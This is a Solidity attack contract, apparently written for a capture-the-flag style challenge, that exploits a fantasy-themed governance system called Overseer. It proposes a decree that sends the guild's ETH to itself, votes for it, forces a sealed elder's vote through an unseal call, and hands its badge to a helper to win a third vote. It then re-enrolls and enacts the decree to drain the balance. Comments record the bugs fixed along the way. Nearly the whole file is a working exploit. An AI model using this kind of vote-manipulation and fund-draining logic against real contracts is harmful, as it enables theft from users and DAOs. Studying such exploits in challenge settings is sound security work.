// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.29;

import {IOverseer} from "targets/overseer/src/interfaces/IOverseer.sol";
import {Guild} from "targets/overseer/src/Guild.sol";
import {SealedTurncloak} from "targets/overseer/src/elders/SealedTurncloak.sol";

contract overseeAttack {
    Guild public guild;
    IOverseer public over;

    bytes32 public constant DECREE_PROPOSED = keccak256("DECREE_PROPOSED");
    bytes32 public constant DECREE_VOTED = keccak256("DECREE_VOTED");
    bytes32 public constant DECREE_ENACTED = keccak256("DECREE_ENACTED");

    // Was: Id and guildBadge were local vars in step1 but needed in step2
    // Fix: store them as state so step2 can access them
    bytes16 public decreeId;
    bytes16 public guildBadge;

    constructor(Guild _guild, IOverseer _overseer) {
        guild = _guild;
        over = _overseer;
        // Was: no guildBadge stored. Need it in both steps
        guildBadge = _guild.badge();
    }

    function step1(
        uint256 _value,
        // Was: "SealedTurncloak sealed" — `sealed` is a reserved keyword in Solidity
        // Fix: renamed to `_turncloak`
        SealedTurncloak _turncloak,
        uint256 proof,
        address _helper
    ) public {
        // 1. propose decree
        decreeId = "1234567891234567";

        // Was: "Edict[] edict" — Edict is defined inside Guild, need Guild.Edict
        // Was: missing `memory` keyword for dynamic array
        Guild.Edict[] memory edict = new Guild.Edict[](1);
        edict[0].to = address(this);
        edict[0].value = _value;
        // Was: data was "0" — that's the ASCII byte 0x30, not empty
        // Fix: empty bytes for a plain ETH transfer (guild sends ETH to this contract)
        edict[0].data = "";

        bytes memory _data = abi.encode(decreeId, edict);

        over.oversee(
            over.folkToBadge(address(this)),
            // Was: bytes32(badge) — oversee expects bytes16 for toBadge
            // Fix: use the guild's badge (bytes16) since we're sending a message TO the guild
            guildBadge,
            DECREE_PROPOSED,
            // Was: bytes16(0) — this is the `subject` param, used as decree identifier
            // Fix: pass the decreeId so the guild can route it
            bytes32(decreeId),
            _data
        );

        // 2. player (this contract) votes Aye
        // Was: vote = 2 — that's Nay! Enum: 0=None, 1=Aye, 2=Nay, 3=Abstain
        // Fix: vote = 1 for Aye
        uint8 vote = 1;
        over.oversee(
            over.folkToBadge(address(this)),
            guildBadge,
            DECREE_VOTED,
            bytes32(decreeId),
            abi.encode(decreeId, vote)
        );

        // 3. SealedTurncloak votes Aye via unseal
        // Was: SealedTurncloak.unseal() — that's calling on the type, not the instance
        // Fix: call on the instance _turncloak
        _turncloak.unseal(decreeId, vote, proof);

        // 4. transfer our badge to the helper so it can cast the 3rd vote
        over.proposeBadgeChange(_helper);
        // Was: missing semicolon here
    }

    function step2() public {
        // Was: referenced `badge` and `Id` which don't exist in this scope
        // Fix: player's old badge was transferred to helper, so we need a NEW badge
        // Re-enroll to get a fresh badge (just need any active badge to call oversee)
        bytes16 newBadge = over.enroll();

        over.oversee(
            newBadge,
            guildBadge,
            DECREE_ENACTED,
            bytes32(decreeId),
            abi.encode(decreeId)
        );
    }

    // Need receive() to accept ETH when the decree sends guild balance here
    receive() external payable {}
}
